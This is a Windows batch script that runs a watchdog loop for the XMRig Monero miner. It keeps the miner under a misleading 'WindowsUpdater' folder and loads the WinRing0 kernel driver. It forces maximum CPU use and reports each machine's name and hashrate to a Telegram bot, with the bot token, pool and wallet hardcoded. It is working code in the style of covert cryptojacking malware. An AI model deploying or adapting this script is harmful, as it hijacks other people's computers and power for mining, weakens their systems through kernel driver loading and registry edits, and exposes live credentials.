@echo off
setlocal enabledelayedexpansion

:: === Configuration ===
set "MUTEX_FILE=%TEMP%\xmrig_watchdog.lock"
set "XMRIG_PATH=C:\ProgramData\WindowsUpdater\xmrig.exe"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "PASSWORD=%COMPUTERNAME%"
set "ALGO=rx/0"
set "MSR_READY=0"

:: Telegram
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

:: HTTP API Port for XMRig
set "API_PORT=16000"

:: === CPU Optimization ===
set "THREADS=12"              :: 6P+6E logical cores
set "CPU_PRIORITY=3"          :: High (but not realtime)
set "CPU_MAX_HINT=95"         :: 95% utilization target
set "AFFINITY_MASK=0x5555"    :: P-cores first (6P+4E)

:: === One-time cleanup ===
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "XMRIG_Cleanup" /t REG_SZ /d "cmd /c del %TEMP%\xmrig_watchdog.lock" /f >nul 2>&1

:: === Prevent multiple watchdogs ===
if exist "!MUTEX_FILE!" (
    echo [!] Watchdog already running. Exiting.
    exit /b
)
echo locked > "!MUTEX_FILE!"

:: ==== ULTIMATE SYSTEM TWEAKS =====
echo [*] Applying maximum performance tweaks...

:: 1. Power Plan to Ultimate Performance
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul 2>&1
powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100 >nul 2>&1

:: 2. Disable Core Parking
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable HPET (High Precision Event Timer)
bcdedit /deletevalue useplatformclock >nul 2>&1

:: 4. MSR Mod Nuclear Option
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1
timeout /t 1 >nul

if exist "%~dp0winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "\??\%~dp0winring0x64.sys" type= kernel start= demand >nul 2>&1
    sc start WinRing0_1_2_0 >nul 2>&1
    timeout /t 2 >nul
    "!XMRIG_PATH!" --msr-test >nul && set "MSR_READY=1"
)

:: === MAIN MINING LOOP ===
set "TICK=0"

:loop
tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
if errorlevel 1 (
    echo [*] Starting XMRig (MAX OPTIMIZED i5-14400)...

    if "!MSR_READY!"=="1" (
        start /min /affinity !AFFINITY_MASK! "" "!XMRIG_PATH!" ^
            -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k ^
            --donate-level=0 ^
            --randomx-1gb-pages ^
            --threads=!THREADS! ^
            --cpu-priority=!CPU_PRIORITY! ^
            --cpu-max-threads-hint=!CPU_MAX_HINT! ^
            --msr ^
            --asm=auto:fast ^
            --randomx-wrmsr=-1 ^
            --randomx-init=1 ^
            --randomx-mode=fast ^
            --cpu-no-yield ^
            --http-port=!API_PORT! ^
            --max-cpu-usage=100
    ) else (
        start /min /affinity !AFFINITY_MASK! "" "!XMRIG_PATH!" ^
            -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k ^
            --donate-level=0 ^
            --randomx-1gb-pages ^
            --threads=!THREADS! ^
            --cpu-priority=!CPU_PRIORITY! ^
            --cpu-max-threads-hint=!CPU_MAX_HINT! ^
            --randomx-init=1 ^
            --randomx-wrmsr=-1 ^
            --cpu-no-yield ^
            --http-port=!API_PORT! ^
            --max-cpu-usage=100
    )

    timeout /t 10 >nul
    set "TICK=420"

    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
        -d "chat_id=!TG_CHAT_ID!" ^
        -d "text=⚡ *XMRig LAUNCHED (MAX OPTIMIZED)* on *!COMPUTERNAME!*`n• Threads: !THREADS!`n• MSR: !MSR_READY!`n• Time: %time%" ^
        -d "parse_mode=Markdown"
)

:: === Stats Reporting ===
set /a TICK+=30
if !TICK! GEQ 420 (
    set "TICK=0"
    for /f "tokens=* delims=" %%s in (
        'powershell -Command "try {(Invoke-WebRequest -UseBasicParsing http://127.0.0.1:!API_PORT!/1/summary).Content} catch {''}"'
    ) do set "STATS=%%s"

    for /f "tokens=2 delims=:" %%H in ('echo !STATS! ^| findstr /i "hashrate"') do set "HASHRATE=%%H"
    for /f "tokens=2 delims=:" %%A in ('echo !STATS! ^| findstr /i "accepted"') do set "ACCEPTED=%%A"
    for /f "tokens=2 delims=:" %%M in ('echo !STATS! ^| findstr /i "msr"') do set "MSR=%%M"
    for /f "tokens=2 delims=:" %%T in ('echo !STATS! ^| findstr /i "total"') do set "TOTAL=%%T"

    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
        -d "chat_id=!TG_CHAT_ID!" ^
        -d "text=💎 *MAX OPTIMIZED i5-14400 REPORT*:`n`n🚀 Hashrate: *!HASHRATE!*`n✅ Accepted: !ACCEPTED!`n🧠 MSR: !MSR!`n⚡ Threads: !THREADS!`n🔥 Total: !TOTAL!`n`n⏱️ %date% %time%" ^
        -d "parse_mode=Markdown"
)

timeout /t 30 >nul
goto loop